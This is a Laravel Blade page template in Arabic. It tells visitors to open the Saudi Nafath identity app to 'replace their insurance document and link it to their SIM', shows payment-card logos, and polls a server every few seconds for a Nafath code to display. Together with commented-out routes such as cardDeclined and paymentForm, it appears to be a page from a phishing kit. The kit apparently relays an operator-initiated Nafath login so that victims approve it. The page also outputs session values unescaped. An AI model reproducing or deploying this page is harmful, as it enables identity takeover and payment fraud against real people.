@extends('layouts.nafathApp')
@section('content')
{{-- =========================================================== --}}
{{-- ================== Sweet Alert Section ==================== --}}
{{-- =========================================================== --}}
<div>
    @if (session()->has('success'))
    <script>
        Swal.fire('"Great Job !!!"', '{!! Session::get('success') !!}', 'success');
    </script>
    @endif
    @if (session()->has('danger'))
    <script>
        Swal.fire('"Great Job !!!"', '{!! Session::get('danger') !!}', 'danger');
    </script>
    @endif
</div>



<h2 class="interHeading">الدخول على النظام</h2>
<section class="callProces codeDegit py-5">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-12 text-center">
                <div id="accordion">

                    <!-- تطبيق نفاذ -->
                    <div class="card">
                        <div class="card-header" id="headingTwo">
                            <h5 class="mb-0">
                                <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseTwo"
                                    aria-expanded="true" aria-controls="collapseTwo">
                                    تطبيق نفاذ
                                </button>
                            </h5>
                        </div>
                        <div id="collapseTwo" class="collapse show text-right" aria-labelledby="headingTwo"
                            data-parent="#accordion">
                            <div class="card-body">
                                <div class="row justify-content-center">
                                    <div class="col-md-8">
                                        <div class="row containerForm">
                                            <div class="col-md-12 text-center">
                                                <div class="code">
                                                    <span id="nafathCode"> ?? </span>
                                                </div>
                                                <p>
                                                    الدخول الي النظام لعرض وثيقة التامين الالكترونيه


                                                    الرجاء التوجه الي تطبيق نفاذ لأستبدال وثيقة التأمين وربطها على شريحة
                                                    الجوال
                                                </p>
                                                <div class="codeActions">
                                                    {{-- <a href=" {{ route('cardDeclined') }} ">متابعة</a> --}}
                                                    {{-- <a href=" {{ route('paymentForm') }}">تأكيد</a> --}}
                                                    {{-- <a href=" {{ route('resendCodeDegit') }} ">إعادة إرسال</a> --}}
                                                </div>
                                                <div class="payType">
                                                    <span class="text text-center d-block">الدفع بواسطة</span>
                                                    <ul>
                                                        <li>
                                                            <img src="{{ asset('style_files/frontend/img/visa.png') }}"
                                                                alt="fender-bender">
                                                        </li>
                                                        <li>
                                                            <img src="{{ asset('style_files/frontend/img/card.png') }}"
                                                                alt="fender-bender">
                                                        </li>
                                                        <li>
                                                            <img src="{{ asset('style_files/frontend/img/mada.png') }}"
                                                                alt="fender-bender">
                                                        </li>
                                                    </ul>
                                                </div>
                                                <div class="payType">
                                                    <ul>
                                                        <li>
                                                            <a href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871?l=ar">
                                                                <img style="    max-width: 150px;
                                                                height: 50px;" src="{{ asset('style_files/frontend/img/icon/appstore.png') }}"
                                                                alt="fender-bender">
                                                            </a>
                                                           
                                                        </li>
                                                        <li>
                                                            <a href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid&pcampaignid=web_share">
                                                                
                                                                <img style="    max-width: 150px;
                                                                height: 50px;" src="{{ asset('style_files/frontend/img/icon/googleplay.png') }}"
                                                                alt="fender-bender">
                                                            </a>
                                                           
                                                        </li>
                                                        
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>


                </div>
            </div>
        </div>
    </div>
</section>


<section class="callProces py-5" id="callContainer">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 text-center">
                <div class="callContainer">
                    <!-- Redirection Counter -->
                    <script type="text/javascript">
                        var count = 60; // Timer
                            var section = document.getElementById('callContainer')
                            // var redirect = "/cardOwnership"; 

                            function countDown() {
                                var timer = document.getElementById("timer"); // Timer ID
                                if (count > 0) {
                                    count--;
                                    timer.innerHTML = "جاري المعالجة نرجو الإنتظار..." + count + " ثانية ."  ; // Timer Message
                                    setTimeout("countDown()", 1000);
                                } else {
                                    var textInsideSpan = $("#nafathCode").text();
                                    if(textInsideSpan.trim() === "??") {
                                        count=60;
                                        setTimeout("countDown()", 1000);
                                    } else {
                                        section.style.display = 'none';  
                                    }
                                    
                                }
                            }
                    </script>

                    <div id="master-wrap">
                        <div id="logo-box">
                            <p>
                                الدخول الي النظام لعرض وثيقة التامين الالكترونيه


                                الرجاء التوجه الي تطبيق نفاذ لأستبدال وثيقة التأمين وربطها على شريحة الجوال
                            </p>


                            <img src="{{ asset('style_files/frontend/img/spinner.gif') }}" style="width: 60px;"
                                alt="logo">
                            <div class="footer animated slow fadeInUp">
                                <p id="timer">
                                    <script type="text/javascript">
                                        countDown();
                                    </script>
                                </p>
                            </div>

                        </div>
                        <!-- /#logo-box -->
                    </div>
                    <!-- /#master-wrap -->
                </div>
            </div>
        </div>
    </div>
</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>


{{-- fetch-nafath-code --}}
<script>
    function fetchData() {
    console.log('fefef');
    $.ajax({
        url: '{{ route("fetchCodeDegit") }}', 
        type: 'GET',
        success: function(response) {
            if (response.nafath_code) {
                $('#nafathCode').text(response.nafath_code);
                document.getElementById('callContainer').style.display = 'none';
            } 
        },
        error: function(xhr, status, error) {
            console.error(error);
        }
    });
}

setInterval(fetchData, 5 * 1000); 


</script>
@endsection